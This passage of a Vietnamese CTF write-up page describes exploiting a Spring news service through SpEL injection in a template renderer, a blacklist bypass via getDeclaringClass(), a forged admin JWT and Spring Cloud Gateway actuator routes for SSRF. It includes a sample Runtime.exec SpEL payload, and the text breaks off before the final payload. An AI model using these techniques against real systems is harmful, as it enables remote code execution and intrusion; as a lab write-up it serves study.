@@ -1,0 +1,437 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Spring Time CTF challenge WriteUp | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring Time CTF challenge WriteUp">
+<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/index.html">
+<meta property="og:site_name" content="Phat Mai Blog">
+<meta property="og:description" content="Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pzhat.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-11-14T19:34:38.235Z">
+<meta property="article:modified_time" content="2025-10-29T19:54:01.149Z">
+<meta property="article:author" content="Phat Mai">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pzhat.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Spring Time CTF challenge WriteUp",
+  "url": "https://pzhat.github.io/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/",
+  "image": "https://pzhat.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-11-14T19:34:38.235Z",
+  "dateModified": "2025-10-29T19:54:01.149Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Phat Mai",
+      "url": "https://pzhat.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Spring Time CTF challenge WriteUp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Spring Time CTF challenge WriteUp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Spring Time CTF challenge WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.235Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-29T19:54:01.149Z" title="Updated 2025-10-30 02:54:01">2025-10-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Spring-Time-CTF-challenge-WriteUp"><a href="#Spring-Time-CTF-challenge-WriteUp" class="headerlink" title="Spring Time CTF challenge WriteUp"></a>Spring Time CTF challenge WriteUp</h1><p><img src="https://hackmd.io/_uploads/r14_Z7wRgx.png" alt="image"></p>
+<p>Web App được chia làm 2 services khác nhau bao gồm:</p>
+<ul>
+<li>gateman : port 8080</li>
+<li>newsman : port 8082</li>
+</ul>
+<h3 id="Phan-tich-tung-chuc-nang-tung-service"><a href="#Phan-tich-tung-chuc-nang-tung-service" class="headerlink" title="Phân tích từng chức năng từng service"></a>Phân tích từng chức năng từng service</h3><ul>
+<li><strong>Gateman</strong></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1d3imwRee.png" alt="image"></p>
+<p>Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như <code>health</code> , <code>info</code> , <code>gateway</code>. Vậy nên có thể biết được đây là service <code>Spring Cloud</code> với chức năng routing đến các <code>routes</code>.</p>
+<ul>
+<li><strong>Newsman</strong></li>
+</ul>
+<p>Ta sẽ đi thẳng vào luôn đầu tiên là <code>NewsController.class</code>: </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code is decompiled from a .class file using FernFlower decompiler (from Intellij IDEA).</span></span><br><span class="line"><span class="keyword">package</span> io.newsman.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.newsman.model.News;</span><br><span class="line"><span class="keyword">import</span> io.newsman.model.RoleEnum;</span><br><span class="line"><span class="keyword">import</span> io.newsman.model.User;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PutMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/news&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NewsController</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> List&lt;News&gt; newsStore = NewsDB.getNewsStore();</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">NewsService</span> <span class="variable">newsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NewsService</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">NewsController</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping</span></span><br><span class="line">   <span class="keyword">public</span> Flux&lt;News&gt; <span class="title function_">getAllNews</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> Flux.fromIterable(<span class="built_in">this</span>.newsStore);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&#123;&quot;/&#123;id&#125;&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> Mono&lt;News&gt; <span class="title function_">getNewsById</span><span class="params">(<span class="meta">@PathVariable</span> String id)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> Flux.fromIterable(<span class="built_in">this</span>.newsStore).filter((news) -&gt; &#123;</span><br><span class="line">         <span class="keyword">return</span> news.getId().equals(id);</span><br><span class="line">      &#125;).next();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@PostMapping</span></span><br><span class="line">   <span class="keyword">public</span> Mono&lt;News&gt; <span class="title function_">addNews</span><span class="params">(<span class="meta">@RequestBody</span> News newNews)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (newNews.getDate() == <span class="literal">null</span>) &#123;</span><br><span class="line">         newNews.setDate(LocalDate.now());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">this</span>.newsStore.add(newNews);</span><br><span class="line">      <span class="keyword">return</span> Mono.just(newNews);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@PutMapping(&#123;&quot;/&#123;id&#125;&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> Mono&lt;News&gt; <span class="title function_">updateNews</span><span class="params">(<span class="meta">@PathVariable</span> String id, <span class="meta">@RequestBody</span> News updatedNews)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> Flux.fromIterable(<span class="built_in">this</span>.newsStore).filter((news) -&gt; &#123;</span><br><span class="line">         <span class="keyword">return</span> news.getId().equals(id);</span><br><span class="line">      &#125;).next().flatMap((existing) -&gt; &#123;</span><br><span class="line">         existing.setTitle(updatedNews.getTitle());</span><br><span class="line">         existing.setDescription(updatedNews.getDescription());</span><br><span class="line">         existing.setBody(updatedNews.getBody());</span><br><span class="line">         existing.setAuthor(updatedNews.getAuthor());</span><br><span class="line">         existing.setDraft(updatedNews.isDraft());</span><br><span class="line">         existing.setDate(LocalDate.now());</span><br><span class="line">         <span class="keyword">return</span> Mono.just(existing);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@GetMapping(&#123;&quot;/&#123;id&#125;/view&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> Mono&lt;String&gt; <span class="title function_">renderNewsBody</span><span class="params">(<span class="meta">@RequestHeader(&quot;Authorization&quot;)</span> String authHeader, <span class="meta">@PathVariable</span> String id)</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> authHeader.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      Map&lt;String, Object&gt; tokenBody = <span class="built_in">this</span>.newsService.getTokenBody(token);</span><br><span class="line">      <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">      user.setName((String)tokenBody.get(<span class="string">&quot;sub&quot;</span>));</span><br><span class="line">      user.setRole(RoleEnum.valueOf((String)tokenBody.get(<span class="string">&quot;role&quot;</span>)));</span><br><span class="line">      <span class="keyword">return</span> Flux.fromIterable(<span class="built_in">this</span>.newsStore).filter((news) -&gt; &#123;</span><br><span class="line">         <span class="keyword">return</span> news.getId().equals(id);</span><br><span class="line">      &#125;).next().map((news) -&gt; &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">this</span>.newsService.render(news.getBody(), user);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/BJvCyED0gx.png" alt="image"></p>
+<p>Đầu tiên là 2 annotation chính là <code>@RestController</code> và <code>@RequestMapping</code> sau đó khởi tạo class <code>NewsController</code> chứa các thuộc tính là <code>newsStore</code> và <code>newsService</code> : </p>
+<ul>
+<li><strong>newsStore</strong>: Một danh sách (List) các đối tượng News, được khởi tạo từ NewsDB.getNewsStore().</li>
+<li><strong>newsService</strong>: Một đối tượng của lớp NewsService, chứa các logic liên quan đến tin tức.</li>
+</ul>
+<p>Tiếp đến là các endpoints khác nhau được HTTP xử lý : </p>
+<h4 id="Lay-tat-ca-tin-tuc-getAllNews"><a href="#Lay-tat-ca-tin-tuc-getAllNews" class="headerlink" title="Lấy tất cả tin tức (getAllNews)"></a><strong>Lấy tất cả tin tức (getAllNews)</strong></h4><p><img src="https://hackmd.io/_uploads/rJLMbNvAlg.png" alt="image"></p>
+<p>Xử lý yêu cầu GET đến đường dẫn <code>/news</code>, phương thức <code>getAllNews()</code> trả về một <code>Flux&lt;News&gt;</code>. Flux là một đối tượng của Project Reactor, đại diện cho một chuỗi (sequence) gồm 0 hoặc nhiều phần tử.</p>
+<ul>
+<li><strong>Lấy tin tức theo id (getNewsById)</strong></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJYYZVwCgl.png" alt="image"></p>
+<p>Xử lý news theo url id cụ thể ví dụ như <code>/news/123</code> nó sẽ tìm kiếm trong <code>newsStore</code> để tìm ra tin tức có id tương ứng để trả về cho user.</p>
+<h4 id="Them-tin-tuc-moi-addNews"><a href="#Them-tin-tuc-moi-addNews" class="headerlink" title="Thêm tin tức mới (addNews)"></a><strong>Thêm tin tức mới (addNews)</strong></h4><p><img src="https://hackmd.io/_uploads/SJmNG4DCeg.png" alt="image"></p>
+<p>Xử lý yêu cầu POST đến đường dẫn &#x2F;news để tạo một tin tức mới.</p>
+<p>Logic:</p>
+<ul>
+<li>@RequestBody chuyển đổi nội dung (body) của yêu cầu (JSON) thành một đối tượng News.</li>
+<li>Nếu ngày tháng của tin tức mới chưa được thiết lập, nó sẽ được gán bằng ngày hiện tại.</li>
+<li>Tin tức mới sau đó được thêm vào newsStore.</li>
+<li>Phương thức trả về một Mono <code>&lt;News&gt;</code> chứa thông tin về tin tức vừa được tạo.</li>
+</ul>
+<h4 id="Cap-nhat-tin-tuc-updateNews"><a href="#Cap-nhat-tin-tuc-updateNews" class="headerlink" title="Cập nhật tin tức (updateNews)"></a><strong>Cập nhật tin tức (updateNews)</strong></h4><p><img src="https://hackmd.io/_uploads/rklX7NDAxl.png" alt="image"></p>
+<p>Xử lý yêu cầu PUT đến đường dẫn của một tin tức cụ thể (ví dụ: &#x2F;news&#x2F;123) để cập nhật thông tin của nó.</p>
+<p>Logic:</p>
+<ul>
+<li>Lấy id từ đường dẫn và dữ liệu cập nhật từ body của yêu cầu.</li>
+<li>Tìm tin tức hiện có với id tương ứng.</li>
+<li>Cập nhật các thuộc tính của tin tức hiện có bằng dữ liệu từ updatedNews.</li>
+<li>Gán ngày cập nhật là ngày hiện tại.</li>
+<li>Trả về một Mono <code>&lt;News&gt;</code> chứa thông tin tin tức đã được cập nhật.</li>
+</ul>
+<h4 id="Xem-noi-dung-tin-tuc"><a href="#Xem-noi-dung-tin-tuc" class="headerlink" title="Xem nội dung tin tức ()"></a><strong>Xem nội dung tin tức ()</strong></h4><p><img src="https://hackmd.io/_uploads/BJdxDVvRxx.png" alt="image"></p>
+<ul>
+<li>Xử lý yêu cầu GET đến đường dẫn &#x2F;news&#x2F;{id}&#x2F;view để xem nội dung của một tin tức đã được <code>render</code>.</li>
+<li>@RequestHeader(“Authorization”) lấy giá trị của header Authorization từ yêu cầu. Header này thường chứa một token xác thực.</li>
+<li>Trích xuất token bằng cách loại bỏ phần “Bearer “.</li>
+<li>Sử dụng newsService.getTokenBody(token) để giải mã token và lấy thông tin người dùng.</li>
+<li>Tạo một đối tượng User.</li>
+<li>Tìm tin tức với id tương ứng.</li>
+<li>Sử dụng newsService.render(news.getBody(), user) để xử lý và trả về nội dung của tin tức.</li>
+<li>Cuối cùng, trả về một Mono <code>&lt;String&gt;</code> chứa nội dung đã được xử lý của tin tức.</li>
+</ul>
+<h3 id="Tim-kiem-sink-co-the-exploit"><a href="#Tim-kiem-sink-co-the-exploit" class="headerlink" title="Tìm kiếm sink có thể exploit"></a>Tìm kiếm sink có thể exploit</h3><p>Sau khi phân tích source trên ta có thể thấy rằng ta hoàn toàn có thể thực hiện SpEL Injection bằng chức năng view. Ở đây kịch bản tấn công sẽ là đăng bài có chứa content của SpEL bằng hàm <code>updateNews</code> sau đó truy cập đến với <code>/id/view</code> để có thể trigger được method render sau đó thực thi SpEL body mà ta đã update lên.</p>
+<p><strong>Luồng Tấn Công (Attack Flow)</strong></p>
+<ul>
+<li>Điểm vào (Entry Point): Attacker có thể kiểm soát nội dung của trường body trong một đối tượng News. Attacker có thể làm điều này bằng cách gửi một yêu cầu POST tới endpoint &#x2F;news (hàm addNews) hoặc một yêu cầu PUT tới endpoint &#x2F;news&#x2F;{id} (hàm updateNews). Dữ liệu này được lưu trữ trong newsStore.</li>
+<li>Điểm Thực thi (Execution Sink): Khi user gửi yêu cầu GET tới endpoint <code>/&#123;id&#125;/view</code> (hàm renderNewsBody), ứng dụng sẽ thực hiện các bước sau:</li>
+<li>Nó lấy đối tượng News từ newsStore dựa trên id.</li>
+<li>Nó lấy trường body của đối tượng News đó (đây chính là nội dung do attacker kiểm soát).</li>
+<li>Nó gọi hàm newsService.render(news.getBody(), user).</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1JkV_vCgx.png" alt="image"></p>
+<p>Ở class <code>NewsService.class</code> ta có đoạn này : </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewsService.java</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">render</span><span class="params">(String bodyTemplate, Object model)</span> &#123;</span><br><span class="line">   <span class="type">SafeEvaluationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeEvaluationContext</span>(model);</span><br><span class="line">   <span class="comment">// Dòng mã cốt lõi gây ra vấn đề nằm ở đây</span></span><br><span class="line">   <span class="keyword">return</span> (String)<span class="built_in">this</span>.parser.parseExpression(bodyTemplate, <span class="built_in">this</span>.templateParser).getValue(ctx, String.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bước 1: Phân tích (Parsing) - “Đọc và Hiểu Biểu Thức”</strong></p>
+<p>Phần này của code chịu trách nhiệm đọc chuỗi đầu vào và chuyển nó thành một biểu thức có thể thực thi được:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.parser.parseExpression(bodyTemplate, <span class="built_in">this</span>.templateParser)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>this.parser</strong>: Đây là một đối tượng của lớp SpelExpressionParser. Nhiệm vụ của nó giống như một “trình biên dịch” cho ngôn ngữ SpEL. Nó nhận một chuỗi văn bản và phân tích cú pháp của nó để xem liệu nó có phải là một biểu thức SpEL hợp lệ hay không.</li>
+<li><strong>bodyTemplate</strong>: Đây chính là chuỗi news.getBody() được lấy từ cơ sở dữ liệu. Đây là điểm mấu chốt của lỗ hổng, vì chuỗi này đến từ người dùng và không được lọc hay kiểm tra. Kẻ tấn công có thể chèn mã SpEL độc hại vào đây, ví dụ: #{T(java.lang.Runtime).getRuntime().exec(‘calc.exe’)}.</li>
+<li><strong>this.templateParser</strong>: Đây là một đối tượng TemplateParserContext. Bối cảnh (context) này chỉ thị cho parser rằng nó không nên coi toàn bộ chuỗi bodyTemplate là một biểu thức duy nhất. Thay vào đó, nó nên tìm kiếm các biểu thức được nhúng bên trong chuỗi theo một cú pháp đặc biệt. Cú pháp mặc định là #{ biểu_thức }.</li>
+<li>Kết quả của bước này: parseExpression trả về một đối tượng Expression. Đối tượng này là phiên bản đã được “biên dịch” và sẵn sàng để thực thi của chuỗi SpEL mà nó tìm thấy trong bodyTemplate. Nếu không tìm thấy biểu thức #{…}, nó sẽ coi toàn bộ chuỗi là văn bản thông thường.</li>
+</ul>
+<p><strong>Bước 2: Thực thi (Execution) - “Chạy Biểu Thức”</strong><br>Sau khi đã có đối tượng Expression, phần còn lại của dòng mã sẽ thực thi nó:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.getValue(ctx, String.class)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>.getValue(…)</strong>: Đây là phương thức thực hiện hành động. Nó lấy đối tượng Expression đã được biên dịch và chạy nó.</li>
+<li><strong>ctx</strong>: Đây là EvaluationContext (bối cảnh đánh giá). Nó cung cấp “môi trường” cho biểu thức chạy. Nó chứa các biến, hàm và đối tượng mà biểu thức có thể truy cập. Trong trường hợp này, ctx chứa đối tượng user (được truyền vào dưới dạng model).</li>
+</ul>
+<p>Từ đây ta đã tìm được sink để có thể khai thác còn nếu muốn hiểu rõ hơn thì nên decompile phần SPRING-EXPRESSION-6.2.11.</p>
+<p><img src="https://hackmd.io/_uploads/BJmnt_wAxx.png" alt="image"></p>
+<p>Vậy là bước đầu ta đã biết được vì sao có thể chạy SpEL và thực thi để thực thi SpEL Injection nhưng có một vấn đề là ở class SafeEvaluationContext nó đã dùng black list chặn đi <code>class</code> <code>getclass</code> <code>forname</code> nhưng dựa theo ý tưởng của <code>CVE-2025-48734</code> ta hoàn toàn có thể sử dụng hàm <code>getDeclaringClass()</code> để bypass và dẫn đến SSRF để truy cập vào service nội bộ qua đó từ đây ta có thể tạo một kênh có thể truy cập từ bên ngoài đến trong service nội bộ : </p>
+<ul>
+<li>Lỗ hổng xảy ra trong Apache Commons BeanUtils, nơi declaredClass property của các enum Java có thể bị truy cập thông qua một cơ chế không được bảo vệ.</li>
+<li>Điều này cho phép kẻ tấn công truy cập ClassLoader của ứng dụng, dẫn đến khả năng thao tác với các tài nguyên thông qua Reflection hoặc các API của Java.</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-wxr5-93ph-8wr9">CVE-2025-48734</a></p>
+<p><img src="https://hackmd.io/_uploads/rJ8s_iv0xg.png" alt="image"></p>
+<p>Với case sử dụng SpEL như này và trong trường hợp này ta phải có jwt token của admin để có thể update các bài viết thì ta cần jwt secret để có thể mạo danh admin.</p>
+<p><img src="https://hackmd.io/_uploads/HyUtWnv0ge.png" alt="image"></p>
+<p>Ở đây nó đã cấp cho ta secret jwt nên ta sẽ tham khảo cách mà <code>CVE-2025-41243</code> hoạt động ở bài viết này :<br><a target="_blank" rel="noopener" href="https://psytester.github.io/CVE-2025-41243_Spring_SpEL_property_modification/">CVE-2025-41243</a></p>
+<p>Với case này ta hoàn toàn có thể tận dụng để thực thi SpEL Injection cùng với đó là lợi dụng SSRF ở trên để đọc system path bên trong thay vì trỏ đến resources vì ở đây nó không hề giới hạn quyền access đến các gateway của Spring-cloud nên ta có thể lợi dụng 2 CVE đó ở đây SpEL được dùng để thực thi cách lệnh hệ thống như là <code>ls</code> hoặc <code>cat</code> thông qua java reflection api cùng với đó là tận dụng cầu nối từ SSRF để truy cập nội bộ nên ta có một cái sink hoàn chỉnh.</p>
+<p><img src="https://hackmd.io/_uploads/ByoHz3vAxe.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ry2SrtwCle.png" alt="image"></p>
+<p>Truy cập đến url <code>http://localhost:8080/actuator/gateway/routes</code> ta có thể thấy được routes cũ hay cho nó là default đi luôn bây giờ ta sẽ tạo một route mới xem thử nó sẽ như thế nào.</p>
+<p><img src="https://hackmd.io/_uploads/ryQtUYv0ll.png" alt="image"></p>
+<p>Tạo route mới có tên testabc ở phần server trả về 201 đã thành công tạo bây giờ ta sẽ refresh để apply route mới vào.</p>
+<p><img src="https://hackmd.io/_uploads/ryxXwYvClg.png" alt="image"></p>
+<p>Thành công refresh lại.</p>
+<p>Trong payload của ta sẽ có các filter để áp dụng vào trong route bao gồm : </p>
+<ul>
